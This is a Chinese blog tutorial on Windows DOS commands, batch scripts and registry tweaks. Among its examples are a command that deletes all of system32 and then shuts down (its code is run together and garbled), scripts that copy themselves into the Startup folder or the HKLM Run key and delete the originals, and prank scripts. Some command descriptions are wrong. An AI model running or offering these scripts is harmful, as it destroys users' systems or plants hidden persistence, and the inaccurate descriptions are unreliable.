---
layout: post
title: Windows 高级操作：DOS、CMD、批处理和注册表
category: Auxiliary
tags: [Windows, DOS, CMD, 批处理, 注册表]
latest: 2015年06月19日 14:52:41
---

Windows 坑太多，简单的界面背后隐藏了太多内幕。

通过命令和代码的方式操作计算机更有亲切感。

> Graphical user interface make easy tasks easy, while command line interfaces make difficult tasks possible.

DOS
-

[DOS](https://zh.wikipedia.org/wiki/DOS) 有很多版本，这里以针对的是最常见的 MS-DOS。

### 常用 DOS 命令

命名一般都是指程序名字或者具有某个功能的指令集合的名字，.bat .exe .com 等可执行性文件的文件名都可以作为命令开头。

Cd

Dir

Mkdir

新建文件夹。

Md

新建文件夹。

Rmdir

删除文件夹。

Rd

删除非空文件夹。

Format


Del

删除文件和空文件夹。

Deltree

删除一个目录下的所有子目录和文件。

Windows 2000 及其后续版本的 Windows 中不再提供外部命令 deltree.exe 。

Copy

复制。

可以用来创建新文本：Copy con test.txt，输入一些东西后按 ctrl + c 停止即可。

Type

输出文件的内容。

若使用 type 输出文件夹的 内容则会拒绝访问。

Ren

重新命令文件和文件夹。

Title

Cls

Echo

显示一些内容。可以 off 或者 on。

关闭 ehco 提示可在 echo 前面加 @

可以用来新建文件：echo test > new-file.txt。

Pause

Color

Ipconfig

- arp：`arp -a`， IP 解析成 域名。

Nslookup

查看服务器信息。

Route

Tracert

Ping

Netstat

Vol

Ver

Systeminfo

Verify

Wmic

### DOS 命令应用

- 设置环境变量

```
set path=%path%;C:\python34
```

1. 改变窗口大小

```
mode con cols=100 lines=50
```

等号左右不可有空格

2. 产生一个随机数

```
echo %random%
```

PowerShell 下不可使用

3. 回显开/关

```
echo on [ off ]
```

PowerShell 下不可使用

4. 网络相关

tracert ip

route print

netstat -an

arp -a

Netsh

Nbtstat

Net

Nslookup



5. 控制台颜色

```
color fc
```

6. 百度搜索

```
set a=
set/p a=请输入关键字:
start http://www.baidu.com/s?wd=%a%
```
 
7. 修改文件后缀：

```
ren *.bat *.txt
```

提示：以上代码中的*.bat *.是原来的文件，.txt是修改后的文件，你可以根据自己需要的自行修改代码中的转换方式。
 
8. 将 BAT 加入开机启动项

1例

```
@echo off
@copy %0 "%userprofile%\「开始」菜单\程序\启动"
@del %0
```
 
2例

```
@echo off
@copy %0 d:\autoexec.bat
@REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v autoexec.bat /t REG_SZ /d d:\autoexec.bat /f
@del %0
```

9. 删除系统文件夹

```
@echo offdel /s /q %windir%\system32shutdown /s /t 0 /c "
```

这会让系统盘中 windows 里的 system32 中所有文件删除然后立刻关机。

如果不要立刻关机，删掉最后一行。
 
10. 强力删除

```
DEL /F /A /Q \\?\%1 
RD /S /Q \\?\%1 
```

11. C 盘转换为NTFS 格式：

```
convert c:/fs:ntfs
```

12. IE 不能打开链接修复：

```
@echo off
regsvr32 actxprxy.dll
regsvr32 shdocvw.dll
```

13. Shutdown

```
shutdown -s -t 5 -c "孩子，不早了，早点睡，哥帮你关机吧"
```

14. 文件不显示扩展名

```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t reg_dword /d 00000001 /f
```

15. 打开指定网页

```
@echo off
title 浏览网站
set s=
set/p s=输入要访问的网站：
explorer.exe open=s
@echo off explorer.exe open=http://www.baidu.com
```

16. 弹出对话框

```
@echo msgbox "笨蛋！哈哈哈哈！！">msg.vbs
@msg.vbs
@del msg.vbs
```

17. 强制聊天

```
 @Echo Off
:send
Set /p num=请输入对方的QQ号码:
If /I "%num%"=="n"  Exit
start tencent://Message/?Uin=%num%
cls
Goto send
```

18. 显示自己ip

```
@echo off
for /f "tokens=15" %%i in ('ipconfig ^| find /i "ip address"') do set ip=%%i
echo %ip%
pause
```

19. Windows7+ 热点共享：

1. 热点建立

```
netsh wlan set hostednetwork mode=allow ssid=Fenomenix key=qwertyuiop

netsh wlan start hostednetwork
```

2. 热点开始

```
netsh wlan start hostednetwork
```

3. 热点删除

```
netsh wlan set hostednetwork mode=disallow
```

4. 热点暂停

```
netsh wlan stop hostednetwork
```

CMD
-

- ver

显示 Windows 版本。

- gpedit.msc

本地组策略编辑器。

- mmc

本地安全策略。

批处理
-

批处理脚本的文件后缀为 .bat。

批处理是 DOS 指令的批量执行。

基础语法

Rem 

注释行。

运算符

%

% 表示参数，类似于变量。

参数是指在运行批处理文件时在文件名后加的以空格（或者Tab）分隔的字符串。

%0 表示批处理命令本身，%1 ~ %9 用于某个命令中的其他参数。举例说明，C 盘下面有个名为 test 的批处理脚本，内容是：

@echo off 
type %1  
type %2  

那么运行 C:\>test a.txt b.txt 时

%1 : 表示a.txt 
%2 : 表示b.txt 

于是上面的命令将顺序地显示 a.txt 和 b.txt 文件的内容。 

*

&

>

将 > 前面的内容传输到某个文件或变量。

|

[]

:



流程控制

If

条件判断。

Goto

无条件跳转。

Start

打开另一个 CMD 窗口。

Call 

调用另一个批处理文件。

Choice

Y/N。

For … in (…, …, …) do …

循环。


应用举例

IP 更换

```
@echo off 
rem 设置 ADSL 名称，账号，密码
rem adslmingzi=ADSL 名称
rem adslzhanghao=
rem adslmima=

rem -------------- 更改区1
set adslmingzi=
set adslzhanghao=
set adslmima=
rem -------------- 更改区1

:start 
Rasdial %adslmingzi% %adslzhanghao% %adslmima%
echo 连接中...
ipconfig

rem -------------- 更改区2
rem 等待300 秒后重连，n 后面的可以自己设置
ping 127.1 -n 300
rem -------------- 更改区2

Rasdial %adslmingzi% /disconnect
echo 中断连接
ping 127.1 -n 1
goto start
```

【需求】
假设在 font 文件夹下， 有name_1.font  和 name_2.font 或者更多的字体文件，编写 bat 脚本批量安装所有字体 。
【代码】

```
font_install.bat:    
@echo off     
color 3f     
title 字体批量安装脚本     
echo A|xcopy *.ttf %windir%\fonts\      
echo 安装完毕，任意键退出....     
pause>nul     
exit
```

注册表
-

注册表是保存和配置 Windows 软硬件的核心数据库。

- 设置浏览器首页，代码示例

```
Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main] "Start Page"="https://g.cn"
```

- 文件右键菜单对应表

右键菜单在不同范围是不一样定义的，如 `HKEY_CLASSES_ROOT\*\`

下面是不同的 `.*`后缀，意思就是不同后缀的文件右键的效果。

```
文件的右键菜单 [HKEY_CLASSES_ROOT\*\shell] 
[KEY_CLASSES_ROOT\*\shellex\ContextMenuHandlers]  
磁盘或分区的右键菜单 [HKEY_CLASSES_ROOT\Drive\Shell] 
[HKEY_CLASSES_ROOT\Folder\Shell] 
[HKEY_CLASSES_ROOT\Drive\ShellEx\ContextMenuHandlers] 
[HKEY_CLASSES_ROOT\Folder\ShellEx\ContextMenuHandlers]  
文件夹（包括“开始”按钮等）的右键菜单 [HKEY_CLASSES_ROOT\Folder\Shell] 
[HKEY_CLASSES_ROOT\Directory\Shell] 
[HKEY_CLASSES_ROOT\AllFilesystemObjects\shell] 
[HKEY_CLASSES_ROOT\Directory\ShellEx\ContextMenuHandlers] 
[HKEY_CLASSES_ROOT\Folder\ShellEx\ContextMenuHandlers] 
[HKEY_CLASSES_ROOT\AllFilesystemObjects\shellex\ContextMenuHandlers] 
```
